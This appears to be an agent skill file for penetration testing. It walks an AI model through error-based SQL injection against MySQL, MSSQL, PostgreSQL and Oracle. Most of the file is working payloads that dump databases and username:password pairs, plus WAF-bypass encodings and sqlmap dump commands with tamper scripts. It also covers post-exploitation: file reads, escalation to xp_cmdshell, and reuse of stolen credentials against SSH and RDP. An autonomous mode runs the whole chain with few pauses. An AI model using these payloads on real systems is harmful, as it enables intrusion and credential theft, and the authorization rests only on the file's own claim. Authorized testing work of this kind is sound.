---
name: sql-injection-error
description: >
  Guide error-based SQL injection exploitation during authorized penetration
  testing. Use when the user has found a SQL injection point and the application
  returns database error messages, or when error-based extraction is suggested
  by another skill. Also triggers on: "error-based SQLi", "EXTRACTVALUE",
  "UPDATEXML", "CONVERT INT", "CAST AS INT", "database errors in response",
  "verbose SQL errors". OPSEC: medium — payloads appear in application and DB
  logs. Tools: sqlmap, burpsuite.
  Do NOT use for blind injection (no visible errors) — use sql-injection-blind
  instead. Do NOT use when UNION output is directly visible — use
  sql-injection-union instead.
---

# Error-Based SQL Injection

You are helping a penetration tester exploit error-based SQL injection. The
target application returns database error messages that can be leveraged to
extract data. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Explain each step before executing. Ask for confirmation
  before sending payloads. Show what to look for in error output.
- **Autonomous**: Execute end-to-end. Auto-detect DBMS from errors, select
  appropriate extraction functions, paginate through data. Report extracted data
  at milestones. Only pause before destructive actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  data extracted, finding discovered, pivot to another skill):
  `### [HH:MM] sql-injection-error → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `sqli-error-users-dump.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

## Prerequisites

- Confirmed SQL injection point (see **web-vuln-discovery**)
- Application displays verbose database error messages in the response
- If errors are generic or hidden, use **sql-injection-blind** instead

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **Injection point** — URL, parameter name, request method
2. **Error observed** — paste the exact error message
3. **DBMS** — if known from error signatures or prior testing

Skip if context was already provided.

## Step 2: Identify DBMS

If the DBMS is unknown, fingerprint from the error message:

| Error Signature | DBMS |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `Unclosed quotation mark` / `CONVERT` | MSSQL |
| `ERROR: invalid input syntax for` | PostgreSQL |
| `ORA-` prefix | Oracle |

If unclear, inject identification payloads:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+          -- MySQL
' AND 1=CONVERT(INT,@@version)--+                        -- MSSQL
' AND 1=CAST(version() AS INT)--+                        -- PostgreSQL
' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--+ -- Oracle
```

## Step 3: Extract Data

Walk through extraction in this order:
1. **Current user and database** — confirms extraction works
2. **List databases/schemas**
3. **List tables** in the target database
4. **List columns** in the target table
5. **Extract data** — credentials, secrets, flags

### MySQL

**EXTRACTVALUE** (MySQL 5.1+) — most reliable:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='TARGET_DB')))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='TARGET_TABLE')))--+
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM TARGET_TABLE)))--+
```

> **32-char truncation**: EXTRACTVALUE/UPDATEXML truncate to ~32 chars. Paginate:
> ```sql
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31)))--+
> ' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT ...),32,31)))--+
> ```

**Alternatives** when EXTRACTVALUE is blocked:
```sql
-- UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--+

-- GTID_SUBSET (MySQL 5.6+)
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--+

-- JSON_KEYS (MySQL 5.7+)
' AND JSON_KEYS(CONCAT(0x7e,(SELECT user())))--+

-- FLOOR(RAND()) — classic double-query error
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- EXP (MySQL 5.5+) — overflow error
' AND EXP(~(SELECT * FROM (SELECT user())a))--+
```

### MSSQL

**CONVERT/CAST** — force type conversion error:
```sql
' AND 1=CONVERT(INT,SYSTEM_USER)--+
' AND 1=CONVERT(INT,DB_NAME())--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb')))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('TARGET_TABLE')))--+
' AND 1=CONVERT(INT,(SELECT TOP 1 username+':'+password FROM TARGET_TABLE))--+
```

**WAF bypass alternatives**:
```sql
' AND 1=SUSER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=USER_NAME((SELECT TOP 1 name FROM master..sysdatabases))--+
' AND 1=0/@@version--+
```

### PostgreSQL

**CAST** — force type conversion:
```sql
' AND 1=CAST(current_user AS INT)--+
' AND 1=CAST(current_database() AS INT)--+
' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS INT)--+
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--+
' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='TARGET_TABLE') AS INT)--+
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM TARGET_TABLE) AS INT)--+
```

**XML helper** for large datasets:
```sql
' AND 1=CAST(query_to_xml('SELECT * FROM TARGET_TABLE',true,false,'') AS INT)--+
```

### Oracle

**utl_inaddr.get_host_name**:
```sql
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--+
' AND 1=utl_inaddr.get_host_name((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables WHERE ROWNUM<=10))--+
```

**Alternatives**:
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--+
' AND 1=(SELECT UPPER(dbms_xmlgen.getxml('SELECT user FROM dual')) FROM dual)--+
' AND 1=(SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual)--+
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))--+
```

## Step 4: Post-Exploitation

After extracting target data:
1. **File read** — MySQL `LOAD_FILE()`, MSSQL `OPENROWSET BULK`, PostgreSQL `pg_read_file()`
2. **Command execution** — route to **sql-injection-stacked** for xp_cmdshell, COPY TO PROGRAM
3. **Credential reuse** — test extracted creds against SSH, RDP, admin panels

## Step 5: Escalate or Pivot

- **Need command execution**: Route to **sql-injection-stacked**
- **UNION becomes viable**: Route to **sql-injection-union**
- **Errors stop appearing**: Route to **sql-injection-blind**
- **Extracted credentials**: Test against other services, document findings

When routing, pass along: injection point, DBMS, current mode, and payloads that worked.

## OPSEC Notes

- Error-based injection is read-only — no database artifacts to clean up
- Payloads appear in application logs, DB slow query logs, and WAF logs
- Defenders look for: `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET`, `CONVERT(INT,`, `CAST(... AS INT)` patterns

## Deep Reference

For WAF bypass, alternative functions, and edge cases:

```
Read ~/docs/public-security-references/SQL Injection/MySQL Injection.md
Read ~/docs/public-security-references/SQL Injection/MSSQL Injection.md
Read ~/docs/public-security-references/SQL Injection/PostgreSQL Injection.md
Read ~/docs/public-security-references/SQL Injection/OracleSQL Injection.md
Read ~/docs/public-security-references/src/pentesting-web/sql-injection/README.md
```

## Troubleshooting

### Error Messages Not Displayed
The application may catch errors and return a generic page:
- Try **sql-injection-blind** (boolean or time-based) instead
- Check if errors appear in HTTP headers (X-Debug, X-Error)
- Check if error details appear in a different response format (JSON error field, XML fault)

### Output Truncated
EXTRACTVALUE/UPDATEXML limit output to ~32 chars. Paginate with SUBSTRING:
```sql
SUBSTRING((SELECT ...),1,31)    -- chars 1-31
SUBSTRING((SELECT ...),32,31)   -- chars 32-62
```

### WAF Blocking Keywords
```sql
-- Replace EXTRACTVALUE with UPDATEXML or GTID_SUBSET
-- Use MySQL conditional comments
' AND /*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,version()))--+

-- Hex-encode string literals
-- 'information_schema' -> 0x696e666f726d6174696f6e5f736368656d61

-- Double URL-encode
%2527%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,version()))--+
```

### Automated Extraction with sqlmap
```bash
# Error-based technique only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=E --dbs

# From Burp request file
sqlmap -r request.txt --batch --technique=E --dbs

# Dump specific table
sqlmap -r request.txt --batch --technique=E -D TARGET_DB -T TARGET_TABLE --dump

# With tamper scripts
sqlmap -r request.txt --batch --technique=E --tamper=between,randomcase --dbs
```
